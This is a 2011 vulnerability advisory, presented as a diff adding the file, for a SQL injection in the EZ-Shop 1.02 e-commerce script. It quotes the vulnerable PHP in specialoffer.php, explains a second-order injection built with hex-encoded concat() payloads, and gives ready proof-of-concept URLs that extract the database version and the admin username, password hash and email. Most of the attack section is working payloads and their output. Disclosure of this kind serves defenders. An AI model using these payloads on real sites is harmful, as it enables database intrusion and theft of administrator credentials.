@@ -1,0 +1,221 @@
+[Security Advisory Details: 14/04/2011]
+     
+[Script] 	       EZ-Shop 1.02
+[Location]       http://www.fcsoftware.co.uk/index.php?page=opensource
+[Vulnerability]  SQL Injection
+[Original Adv]   http://y-osirys.com/security/exploits/id28
+[Author]         Giovanni Buzzin, "Osirys"
+[Site]           y-osirys.com
+[Contact]        osirys[at]autistici[dot]org
+     
+Greets to: stratsec,senseofsecurity
+
+    
+------------------------------------------------------------------------------------------------------------
+[CMS Description]
+     
+EZ-Shop is a simple out of the box e-Commerce solution aimed at small startups and independant retailers
+looking to get into online trade. The system was initially designed to be simple and easy to use but with
+many features that more complex packages lack. 
+     
+
+     
+------------------------------------------------------------------------------------------------------------
+[Security Flaw]
+     
+EZ-Shop is prone to SQL Injection due to insufficent user supplied input sanization.
+	
+[code:/specialoffer.php:line 249-283]
+
+		  <?php
+		  if(isset($_REQUEST['specialid']) && ($_REQUEST['specialid'])!="")
+		{
+			?><table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+        <tr>
+          <td height="23" colspan="2" class="head"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+			
+		   <td style="width:1px;"></td>
+		   <td height="22" bgcolor="#000000" class="style1" style="padding-left:14px;">Products</td>
+		   <td style="width:1px;"></td>
+		   </tr>
+          </table></td>
+        </tr>
+		<?php 
+			$speid=$_REQUEST['specialid'];
+			$sql="select * from tblprodgiftideas where intgiftideaid='$speid'";
+			$resgid=$obj_db->select($sql);
+			if(count($resgid)>0)
+			{
+				for($p=0;$p<count($resgid);$p++)
+				{
+					//echo $resgid[$p]['intprodid']."<br>";
+					$prid=$resgid[$p]['intprodid'];
+			 $sql6="select * from tblproddesc where intid='$prid'";
+			  $resprname1=$obj_db->select($sql6);
+			 if(count($resprname1)>0)
+			 {
+				$desc=$resprname1[0]['txtdesc'];
+				
+				$resprname1=$resprname1[0]['varprodname'];
+				
+			 }
+			 else
+			 {
+			 	$resprname1="";
+			 }
+			  $sql6="select * from tblproducts where intprodid='$prid'";
+			 
+			  $resprname=$obj_db->select($sql6);
+			  if(count($resprname)>0)
+			  {
+			  $proprice=$resprname[0]['decprice'];
+		?>
+
+        <tr>
+          <td width="50%"><table width="100%" height="170" border="0" cellpadding="0" cellspacing="1" bordercolor="#CCCCCC" class="proborder">
+            <tr>
+              <td height="25" colspan="2" class="fntstyle"> <?php echo $resprname1;?></td>
+
+[/code]
+
+This vulnerability is kind of weird, since is an SQL Injection injected through a column result of another SQL Injection.
+The variable $speid comes from $_REQUEST, without being properly sanitized, here the Injection starts.
+
+QUERY 1: $sql="select * from tblprodgiftideas injectwhere intgiftideaid='$speid'";
+
+The result of this Query is not showed on the screen, but is sent to another query: QUERY 2.
+
+QUERY 2: $sql6="select * from tblproddesc where intid='$prid'";
+
+As we can see from this piece of code:
+
+[code]
+			$speid=$_REQUEST['specialid'];
+			$sql="select * from tblprodgiftideas where intgiftideaid='$speid'";
+			$resgid=$obj_db->select($sql);
+			if(count($resgid)>0)
+			{
+				for($p=0;$p<count($resgid);$p++)
+				{
+					//echo $resgid[$p]['intprodid']."<br>";
+					$prid=$resgid[$p]['intprodid']; <---- prid
+			 $sql6="select * from tblproddesc where intid='$prid'";
+[/code]
+
+This time the result of QUERY 2 is showed through : <?php echo $resprname1;?>
+
+
+So basically, what we need to do is to inject a query into QUERY 1 that will give back as a result another SQL Injection, injected
+then into QUERY 2 through $prid.
+
+To do this, concat() mysql functions can become very helpful. Let's inject the second Injection as separator encrypted in hex.
+Ex: concat(hex(SQL_PART1),something,hex(SQL_PART2));
+something could be: @@version
+Since we don't want it to interfer with the Injection, we can comment it, updating the concat() in this way:
+
+SQL_PART1 : 1' union select 1,2,/* --> hex(SQL_PART1) = 0x312720756e696f6e2073656c65637420312c322c2f2a
+something : @@version
+SQL_PART" : */@@version,4,5#       --> hex(SQL_PART2) = 0x2a2f404076657273696f6e2c342c3523
+
+Concat will be: concat(0x312720756e696f6e2073656c65637420312c322c2f2a,@@version,0x2a2f404076657273696f6e2c342c3523)
+
+mysql> select concat(0x312720756e696f6e2073656c65637420312c322c2f2a,@@version,0x2a2f404076657273696f6e2c342c3523);                            
++-----------------------------------------------------------------------------------------------------+
+| concat(0x312720756e696f6e2073656c65637420312c322c2f2a,@@version,0x2a2f404076657273696f6e2c342c3523) |
++-----------------------------------------------------------------------------------------------------+
+| 1' union select 1,2,/*5.1.49-1ubuntu8.1*/@@version,4,5#                                             |
++-----------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+                                                                                                                                              
+mysql> 
+
+Here is the Second Injection: 1' union select 1,2,/*5.1.49-1ubuntu8.1*/@@version,4,5#
+
+
+## Background Operation
+
+Injection 1 on QUERY 1: 1' union select 1,2,concat(0x312720756e696f6e2073656c65637420312c322c2f2a,@@vers
+				    ion,0x2a2f404076657273696f6e2c342c3523)%23
+QUERY 1: 			    select * from tblprodgiftideas where intgiftideaid='1' union select 1,2,concat(0
+				    x312720756e696f6e2073656c65637420312c322c2f2a,@@version,0x2a2f404076657273696f6e
+				    2c342c3523)#'
+
+Backend Injection 2 on QUERY 2: 1' union select 1,2,/*5.1.49-1ubuntu8.1*/@@version,4,5#'
+QUERY 2: 					  select * from tblproddesc where intid='1' union select 1
+						  ,2,/*5.1.49-1ubuntu8.1*/@@version,4,5#'
+
+(5.1.49-1ubuntu8.1 is commented in order to not interfer with our query) ->
+-> union select 1,2,@@version,4,5
+
+That will finally show through $resprname1 our @@version: 5.1.49-1ubuntu8.1
+
+
+SQL Inection p0c: 
+
+/[cms path]/specialoffer.php?specialid=1' union select 1,2,concat(0x312720756e696f6e2073656c6563742031
+2c322c2f2a,@@version,0x2a2f404076657273696f6e2c342c3523)%23
+
+
+Since administrations details are stored in tbladmin table:
+[tbladmin]:[intid,varadminfname,varadminname,varpassword,intstatus,varemail,ttLastLogginDate]
+
+Injection: 
+
+SQL_PART1: 1' union select 1,2,/*
+	hex(SQL_PART1) = 0x312720756e696f6e2073656c65637420312c322c2f2a
+something: @@version
+SQL_PART1: */concat(0x3a,varadminname,0x3a,varpassword,0x3a,varemail,0x3a),4,5 from tbladmin#
+	hex(SQL_PART2) = 0x2a2f636f6e63617428307833612c76617261646d696e6e616d652
+				  c307833612c76617270617373776f72642c307833612c766172656d
+				  61696c2c30783361292c342c352066726f6d2074626c61646d696e23
+
+concat(0x312720756e696f6e2073656c65637420312c322c2f2a,@@version,0x2a2f636f6e63617428
+307833612c76617261646d696e6e616d652c307833612c76617270617373776f72642c307833612c7661
+72656d61696c2c30783361292c342c352066726f6d2074626c61646d696e23)
+
+Final Injection: 
+
+/specialoffer.php?specialid=1' union select 1,2,concat(0x312720756e696f6e2073656c65637
+420312c322c2f2a,@@version,0x2a2f636f6e63617428307833612c76617261646d696e6e616d652c3078
+33612c76617270617373776f72642c307833612c766172656d61696c2c30783361292c342c352066726f6d
+2074626c61646d696e23)%23
+
+That will show: 
+
+:admin:21232f297a57a5a743894a0e4a801fc3:support@fcsoftware.co.uk:
+
+
+-> Owned
+
+
+
+------------------------------------------------------------------------------------------------------------
+[Exploit]
+     
+MySQL Version p0c:
+
+[p0c]
+	/[cms path]/specialoffer.php?specialid=1' union select 1,2,concat(0x312720756e696f6e2073656c65637
+	420312c322c2f2a,@@version,0x2a2f404076657273696f6e2c342c3523)%23
+[/p0c]
+     
+Admin's details p0c:
+[p0c]
+	/[cms_path]/specialoffer.php?specialid=1' union select 1,2,concat(0x312720756e696f6e2073656c65637
+	420312c322c2f2a,@@version,0x2a2f636f6e63617428307833612c76617261646d696e6e616d652c307833612c76617
+	270617373776f72642c307833612c766172656d61696c2c30783361292c342c352066726f6d2074626c61646d696e23)%23
+[/p0c]
+
+
+
+------------------------------------------------------------------------------------------------------------
+[Credits]
+
+Credit goes to Giovanni Buzzin, "Osirys" for the discover of this vulnerability.
+(Meglio)
+     
+
+
+------------------------------------------------------------------------------------------------------------
+[END: 14/04/2011]
